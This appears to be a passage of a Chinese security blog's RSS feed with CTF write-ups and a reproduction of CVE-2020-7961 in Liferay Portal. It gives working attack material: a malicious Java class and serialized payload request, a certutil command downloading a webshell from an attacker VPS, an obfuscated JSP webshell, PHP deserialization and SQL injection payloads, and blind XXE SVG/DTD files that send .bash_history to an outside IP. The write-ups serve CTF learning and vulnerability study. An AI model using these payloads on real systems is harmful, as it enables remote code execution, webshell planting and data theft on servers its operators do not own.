&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到flag；&lt;/p&gt;
&lt;p&gt;flag{e8e4454d-c127-4caf-89e2-86e266c83aa1}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CVE-2020-7961 Liferay Portal 反序列化-复现</title>
        <link>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170944.png" alt="Featured image of post CVE-2020-7961 Liferay Portal 反序列化-复现" /&gt;&lt;h3 id=&#34;漏洞说明&#34;&gt;漏洞说明&lt;/h3&gt;
&lt;p&gt;Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高&lt;/p&gt;
&lt;h3 id=&#34;影响范围&#34;&gt;影响范围&lt;/h3&gt;
&lt;p&gt;Liferay Portal 6.1、6.2、7.0、7.1、7.2&lt;/p&gt;
&lt;h3 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h3&gt;
&lt;p&gt;漏洞环境：&lt;/p&gt;
&lt;p&gt;windows 10&lt;/p&gt;
&lt;p&gt;jre1.8.0_221&lt;/p&gt;
&lt;p&gt;jdk1.8.0_221&lt;/p&gt;
&lt;p&gt;tomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1
（我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）&lt;/p&gt;
&lt;h3 id=&#34;启动环境&#34;&gt;启动环境&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;E:\tmp\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin&amp;gt; .\catalina.bat run
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问 &lt;code&gt;http://localhost:8080/&lt;/code&gt; 全部默认配置就可以&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170944.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
&lt;p&gt;思路：构造恶意class文件-&amp;gt;构造序列化-&amp;gt;反序列化-&amp;gt;加载VPS上面恶意evil.class文件-&amp;gt;实现下载webshell&lt;/p&gt;
&lt;h4 id=&#34;构造恶意class文件&#34;&gt;构造恶意class文件&lt;/h4&gt;
&lt;p&gt;在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-&amp;gt;编译class文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class LifExp { 
    static { 
        try { 
            String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;calc.exe&amp;quot;};//命令执行
            java.lang.Runtime.getRuntime().
exec(cmd).waitFor(); 
        } catch ( Exception e ) { 
            e.printStackTrace(); 
        } 
    } 
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 &lt;code&gt;javac .\LifExp.java&lt;/code&gt; 生成class文件&lt;/p&gt;
&lt;p&gt;在当前目录使用 &lt;code&gt;python -m SimpleHTTPServer 8000&lt;/code&gt; 监听8000端口启动一个wbe服务&lt;/p&gt;
&lt;h4 id=&#34;构造序列化&#34;&gt;构造序列化&lt;/h4&gt;
&lt;p&gt;使用 &lt;code&gt;marshalsec-0.0.3-SNAPSHOT-all.jar&lt;/code&gt; 文件进行序列化：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://你的IP:你的端口/ LifExp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171046.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;构造http数据包&#34;&gt;构造HTTP数据包&lt;/h4&gt;
&lt;p&gt;把 &lt;code&gt;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=&lt;/code&gt; 后面的值替换为上面选中部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /api/jsonws/invoke HTTP/1.1
Host: 192.168.207.133:8080
Content-Length: 1365
Content-Type: application/x-www-form-urlencoded
Connection: close
 
cmd={&amp;quot;/expandocolumn/add-column&amp;quot;:{}}&amp;amp;p_auth=o3lt8q1F&amp;amp;formDate=1585270368703&amp;amp;tableId=1&amp;amp;name=2&amp;amp;type=3&amp;amp;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={&amp;quot;userOverridesAsString&amp;quot;:&amp;quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740019687474703a2f2f35392e3131302e3135372e343a383030302f740003466f6f;&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发包，不出意外会返回500&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171059.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;但是计算器是弹出来了；&lt;/p&gt;
&lt;p&gt;别看他只是一个小小的计算器，但是他的威力是无穷的，因为你可以&lt;del&gt;弹一万个计算器&lt;/del&gt;执行其他命令来对靶机进行攻击，比如下载一个webshell&lt;/p&gt;
&lt;h4 id=&#34;出网下载webshell&#34;&gt;出网下载webshell&lt;/h4&gt;
&lt;p&gt;这个得免杀JSPshell，别问，问就是直接给你ban了，之前用一个一句话，除了whoami都不能来事儿。&lt;/p&gt;
&lt;p&gt;免杀jspshell地址：https://www.jianshu.com/p/12dce12b2036&lt;/p&gt;
&lt;p&gt;VPS上面构造一个txt：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%@ page contentType=&amp;quot;text/html;charset=UTF-8&amp;quot; language=&amp;quot;java&amp;quot; %&amp;gt;
&amp;lt;%@ page import=&amp;quot;sun.misc.BASE64Decoder&amp;quot; %&amp;gt;
&amp;lt;%
    if(request.getParameter(&amp;quot;cmd&amp;quot;)!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer(&amp;quot;amF2YS5sYW5nLlJ1bnRpbWU=&amp;quot;)));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer(&amp;quot;ZXhlYw==&amp;quot;)), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer(&amp;quot;Z2V0UnVudGltZQ==&amp;quot;))).invoke(null, new
                        Object[]{}), request.getParameter(&amp;quot;cmd&amp;quot;) );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
    }
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;替换编译下面的java：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class LifExp { 
    static { 
        try { 
        	String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;certutil.exe -urlcache -split -f&amp;quot;, &amp;quot;http://IP:端口/jspshell.txt&amp;quot;, &amp;quot;..\\webapps\\ROOT\\jspshell.jsp&amp;quot;};
            java.lang.Runtime.getRuntime().
exec(cmd).waitFor(); 
        } catch ( Exception e ) { 
            e.printStackTrace(); 
        } 
    } 
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第四行，Windows下使用certutil.exe可以实现文件下载，curl功能。&lt;/p&gt;
&lt;p&gt;因为当前靶机执行命令的路径是 &lt;code&gt;tomcat\bin &lt;/code&gt; 所以我们下载webshell的时候，一定要下载到index.jsp相同路径便于我们访问，也就是 &lt;code&gt;tomcat-9.0.17\webapps\ROOT&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;执行了命令之后，我们在这个文件夹下面已经可以看到我们的shell了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171112.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;而这个时候我们已经可以正常访问shell了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171121.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?cmd=cmd /c 命令&lt;/code&gt; 记得url编码；&lt;/p&gt;
&lt;p&gt;如果我们要查看桌面的某个文件，比如一个叫做flag.txt的文件，直接执行 &lt;code&gt;type %userprofile%\desktop\flag*&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171211.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;原理剖析&#34;&gt;原理剖析&lt;/h3&gt;
&lt;p&gt;太菜了，不会。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/column/236744.html&#34;&gt;https://www.freebuf.com/column/236744.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/203870&#34;&gt;https://www.anquanke.com/post/id/203870&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DozerCTF2020_web</title>
        <link>https://anthem-whisper.github.io/p/dozerctf2020_web/</link>
        <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/dozerctf2020_web/</guid>
        <description>&lt;p&gt;又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;sqli-labs-0&#34;&gt;sqli-labs 0&lt;/h3&gt;
&lt;p&gt;考点：URL二次编码，堆叠注入&lt;/p&gt;
&lt;p&gt;堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。&lt;/p&gt;
&lt;p&gt;查看库名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=1%2527;show%20databases;%23 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看表名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=1%2527;show%20tables;%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看表的第一条数据：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{594cb6af684ad354b4a59ac496473990}&lt;/p&gt;
&lt;h3 id=&#34;白给的反序列化&#34;&gt;白给的反序列化&lt;/h3&gt;
&lt;p&gt;考点：PHP反序列化&lt;/p&gt;
&lt;p&gt;开题送码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class home
{
    private $method;
    private $args;
    function __construct($method, $args)
    {
        $this-&amp;gt;method = $method;
        $this-&amp;gt;args = $args;
    }

    function __destruct()
    {
        if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {
            call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);
        }
    }

    function mysys($path)
    {
        print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));
    }
    function waf($str)
    {
        if (strlen($str) &amp;gt; 8) {
            die(&amp;quot;No&amp;quot;);
        }
        return $str;
    }

    function __wakeup()
    {
        $num = 0;
        foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {
            $this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));
            $num += 1;
            if ($num &amp;gt; 2) {
                die(&amp;quot;No&amp;quot;);
            }
        }
    }
}

if ($_GET[&#39;path&#39;]) {
    $path = @$_GET[&#39;path&#39;];
    unserialize($path);
} else {
    highlight_file(__FILE__);

}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;核心是在 &lt;code&gt;mysys&lt;/code&gt; 函数，可以返回base64编码之后的exec内容；&lt;/p&gt;
&lt;p&gt;而 &lt;code&gt;__destruct&lt;/code&gt; 里面首先是一个 &lt;code&gt;in_array&lt;/code&gt; 的判断，如果 &lt;code&gt;$this-&amp;gt;method&lt;/code&gt; 的值是在一个数组里面的话，就执行 &lt;code&gt;call_user_func_array&lt;/code&gt; ，而这个数组只有一个元素那就是 &lt;code&gt;mysys&lt;/code&gt; ，所以我们method就传入mysys字符串就行。&lt;/p&gt;
&lt;p&gt;至于call_user_func_array，PHP手册是这样写的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mixed call_user_func_array ( callable $callback , array $param_arr )
把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

callback
  被调用的回调函数。
param_arr
  要被传入回调函数的数组，这个数组得是索引数组。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么我们只需要给 &lt;code&gt;$args&lt;/code&gt; 赋一个数组就行了；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;&#39;&#39;
  题目源码
&#39;&#39;&#39;

$pop = new home(&#39;mysys&#39;,array(&#39;flag.php&#39;));
echo serialize($pop);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到 &lt;code&gt;O:4:&amp;quot;home&amp;quot;:2:{s:12:&amp;quot; home method&amp;quot;;s:5:&amp;quot;mysys&amp;quot;;s:10:&amp;quot; home args&amp;quot;;a:1:{i:0;s:8:&amp;quot;flag.php&amp;quot;;}}&lt;/code&gt; 注入private对象加个%00就行。&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?path=O:4:&amp;quot;home&amp;quot;:2:{s:12:&amp;quot;%00home%00method&amp;quot;;s:5:&amp;quot;mysys&amp;quot;;s:10:&amp;quot;%00home%00args&amp;quot;;a:1:{i:0;s:8:&amp;quot;flag.php&amp;quot;;}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}&lt;/p&gt;
&lt;h3 id=&#34;简单域渗透-flag1&#34;&gt;简单域渗透-flag1&lt;/h3&gt;
&lt;p&gt;考点：CVE-2020-7961 Liferay Portal 反序列化&lt;/p&gt;
&lt;p&gt;请移步本站：&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/cve-2020-7961liferay-portal-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-%e5%a4%8d%e7%8e%b0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2020-7961 Liferay Portal 反序列化-复现&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;svgggggg&#34;&gt;svgggggg!&lt;/h3&gt;
&lt;p&gt;考点：XXE盲打，SSRF，sqli写shell&lt;/p&gt;
&lt;p&gt;打开题目，叫我们给一个URL，然后check这个URL指向的file是不是svg图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171235.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;什么是svg&#34;&gt;什么是SVG？&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;SVG 指可伸缩矢量图形 (Scalable Vector Graphics)&lt;/li&gt;
&lt;li&gt;SVG 用来定义用于网络的基于矢量的图形&lt;/li&gt;
&lt;li&gt;SVG 使用 XML 格式定义图形&lt;/li&gt;
&lt;li&gt;SVG 图像在放大或改变尺寸的情况下其图形质量不会有所损失&lt;/li&gt;
&lt;li&gt;SVG 是万维网联盟的标准&lt;/li&gt;
&lt;li&gt;SVG 与诸如 DOM 和 XSL 之类的 W3C 标准是一个整体&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于SVG是基于XML的矢量图，因此可以支持Entity（实体）功能。&lt;/p&gt;
&lt;p&gt;我们自然而然地想到了XXE。&lt;/p&gt;
&lt;h4 id=&#34;利用svg进行xxe攻击&#34;&gt;利用SVG进行XXE攻击&lt;/h4&gt;
&lt;p&gt;我从网上搜索了一个SVG图片的源码，改装了一下，在VPS上面命名为 &lt;code&gt;1.svg&lt;/code&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE fortiguard [ 
&amp;lt;!ENTITY lab &amp;quot;HELLO&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; height=&amp;quot;200&amp;quot; width=&amp;quot;200&amp;quot;&amp;gt;
  &amp;lt;text y=&amp;quot;20&amp;quot; font-size=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;lab;&amp;lt;/text&amp;gt;	
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交地址，我们发现我们的实体已经起作用了（这里只是因为挡住了，但是F12可以看到）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171246.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么大致就能实锤是XXE；&lt;/p&gt;
&lt;p&gt;尝试直接读取文件：&lt;/p&gt;
&lt;p&gt;1.svg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE fortiguard [ 
&amp;lt;!ENTITY lab SYSTEM &amp;quot;file:///home/r1ck/.bash_history&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; height=&amp;quot;200&amp;quot; width=&amp;quot;200&amp;quot;&amp;gt;
  &amp;lt;text y=&amp;quot;20&amp;quot; font-size=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;lab;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然不可能这么简单，页面虽然正常返回信息，但是我们并不能直接读到我们想要的东西；&lt;/p&gt;
&lt;p&gt;无回显，但是又是XXE，我们又自然地想到了XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。&lt;/p&gt;
&lt;p&gt;构造 &lt;code&gt;entity.svg&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE fortiguard [ 
&amp;lt;!ENTITY lab SYSTEM &amp;quot;file:///home/r1ck/.bash_history&amp;quot;&amp;gt;
&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///home/r1ck/.bash_history&amp;quot;&amp;gt;
&amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://IP:端口/1.dtd&amp;quot;&amp;gt;
%dtd;
%send;
]&amp;gt;
&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; height=&amp;quot;200&amp;quot; width=&amp;quot;200&amp;quot;&amp;gt;
        &amp;lt;text y=&amp;quot;20&amp;quot; font-size=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;lab;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造 &lt;code&gt;1.dtd&lt;/code&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!ENTITY % all
        &amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &#39;http://IP:端口/?%file;&#39;&amp;gt;&amp;quot;
&amp;gt;
%all;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发送 &lt;code&gt;entity.svg&lt;/code&gt; 地址；&lt;/p&gt;
&lt;p&gt;我们可以看到dtd文件实际上已经被加载了，但是却没有收到读取文件之后的请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171303.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;判断问题出在读文件那一步，但是倘若我们读取的文件是一个不存在的文件，比如file:///xxx/xx.x，那么我们发送svg文件地址之后，页面是没有回显内容的；
但是如果我们读取的是一个存在的文件，页面会有回显内容。&lt;/p&gt;
&lt;p&gt;那么我们可以推测，读文件是读到了，但是在发包的时候出了问题。&lt;/p&gt;
&lt;p&gt;问题就出在换行和空格。&lt;/p&gt;
&lt;p&gt;因为是GET请求发送到VPS，所以我们不能有换行和空格，不然就会400。&lt;/p&gt;
&lt;p&gt;解决方法当然是base64。xml解析器支持使用php://filter进行编码&lt;/p&gt;
&lt;p&gt;修改 &lt;code&gt;entity.svg&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE fortiguard [ 
&amp;lt;!ENTITY lab SYSTEM &amp;quot;file:///home/r1ck/.bash_history&amp;quot;&amp;gt;
&amp;lt;!ENTITY % file SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&amp;quot;&amp;gt;
&amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://59.110.157.4:8000/1.dtd&amp;quot;&amp;gt;
%dtd;
%send;
]&amp;gt;
&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; height=&amp;quot;200&amp;quot; width=&amp;quot;200&amp;quot;&amp;gt;
        &amp;lt;text y=&amp;quot;20&amp;quot; font-size=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;lab;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171320.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;读到了.bash_history：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /app
php -S 0.0.0.0:8080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;明显是SSRF打内网；&lt;/p&gt;
&lt;h4 id=&#34;利用xxe打ssrf&#34;&gt;利用XXE打SSRF&lt;/h4&gt;
&lt;p&gt;修改 &lt;code&gt;entity.svg&lt;/code&gt; ，得到 &lt;code&gt;127.0.0.1:8080&lt;/code&gt; 的源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
&amp;lt;title&amp;gt;index&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
Hi!
You Find Me .
Flag is nearby.
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

Array
(
    [id] =&amp;gt; 1
    [name] =&amp;gt; test
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到是个sqli；&lt;/p&gt;
&lt;p&gt;根据hint，我们需要直接getshell，测出来没有堆叠，但是可以联合查询&lt;/p&gt;
&lt;p&gt;这里我们使用union select直接写一个shell到/app目录；&lt;/p&gt;
&lt;p&gt;但是到了这里遇到了玄学原因，php一句话写进去会莫名其妙消失，等开源之后本地复现；&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过4-5个字符限制getshell</title>
        <link>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</link>
        <pubDate>Tue, 02 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</guid>
        <description>&lt;p&gt;这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下&lt;/p&gt;
&lt;p&gt;参考：https://www.anquanke.com/post/id/87203&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;源码&#34;&gt;源码&lt;/h3&gt;
&lt;p&gt;五字版本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 5) {
        @exec($_GET[&#39;cmd&#39;]);
    } else if (isset($_GET[&#39;reset&#39;])) {
        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
    }
    highlight_file(__FILE__);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;四字版本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 4) {
        @exec($_GET[&#39;cmd&#39;]);
    } else if (isset($_GET[&#39;reset&#39;])) {
        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
    }
    highlight_file(__FILE__);
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;预备知识&#34;&gt;预备知识&lt;/h3&gt;
&lt;p&gt;在cmd长度小于5（4）个字符的时候用 &lt;code&gt;exec&lt;/code&gt; 函数执行系统命令，不过 &lt;code&gt;exec&lt;/code&gt; 函数是默认没有回显的，这里我们就只能盲打。&lt;/p&gt;
&lt;h4 id=&#34;linux用连接多行命令&#34;&gt;Linux用\连接多行命令&lt;/h4&gt;
&lt;p&gt;Linux系统中支持用 &lt;code&gt;\&lt;/code&gt; 字符来分割一个多行命令，在一个文件中即使有无法识别的命令，报错，也不会影响其他正常命令执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170817.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;用两个字符在linux下创建文件&#34;&gt;用两个字符在Linux下创建文件&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170833.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;ls的文件排序和ls--t的文件排序&#34;&gt;ls的文件排序和ls -t的文件排序&lt;/h4&gt;
&lt;p&gt;ls&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170844.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ls -t&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170853.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可以看到， &lt;code&gt;ls&lt;/code&gt; 是按照alphabet来排序的， &lt;code&gt;ls -t&lt;/code&gt; 是按照创建时间的顺序来排序的&lt;/p&gt;
&lt;h3 id=&#34;分析&#34;&gt;分析&lt;/h3&gt;
